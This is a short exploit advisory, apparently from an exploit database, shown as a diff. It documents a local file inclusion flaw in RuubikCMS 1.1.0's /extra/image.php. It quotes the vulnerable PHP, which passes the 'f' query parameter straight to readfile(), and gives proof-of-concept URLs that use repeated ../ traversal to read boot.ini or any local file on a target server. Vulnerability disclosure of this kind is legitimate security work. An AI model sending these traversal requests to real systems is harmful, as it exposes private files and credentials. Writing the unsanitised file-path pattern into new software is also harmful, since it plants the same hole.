@@ -1,0 +1,39 @@
+ 
+# Exploit Title: [Ruubikcms v 1.1.0 (/extra/image.php) Local File Inclusion Vulnerability]
+# Date: [2011/10/16]
+# Author: [Sangyun YOO]
+# Software Link: [http://ruubikcms.com/ruubikcms/download.php?f=ruubikcms110.zip]
+# Version: [Ruubikcms v 1.1.0]
+# Tested on: [Windows 7 Starter K]
+---------------------------------------
+ 
+source of /extra/image.php:
+1: if (!isset($_GET['f']) OR empty($_GET['f'])) die("Please specify 2: image.");
+3: $fpath = BASE_DIR.$_GET['f'];
+4: if (!is_file($fpath)) die("File does not exist.");
+5: 
+6: // file size in bytes
+7: // $fsize = filesize($fpath);
+8: 
+9: // get mime type
+10: $mtype = '';
+11:
+12: if (function_exists('mime_content_type')) {
+13: $mtype = mime_content_type($fpath);
+14: } elseif (function_exists('finfo_file')) {
+15: $finfo = finfo_open(FILEINFO_MIME); // return mime type
+16: $mtype = finfo_file($finfo, $fpath);
+17: finfo_close($finfo);
+18: }
+19:
+20: if ($mtype == '') {
+21: $mtype = "image/jpeg";
+22: }
+23:
+24: header("Content-type: $mtype");
+25: readfile($fpath); <--------------------- LFI
+
+proof of concept:
+
+http://[attacked_box]/[ruubikcms1.1.0]/extra/image.php?f=../../../../../../../../boot.ini
+http://[attacked_box]/[ruubikcms1.1.0]/extra/image.php?f=../../../../../../../../[localfile]
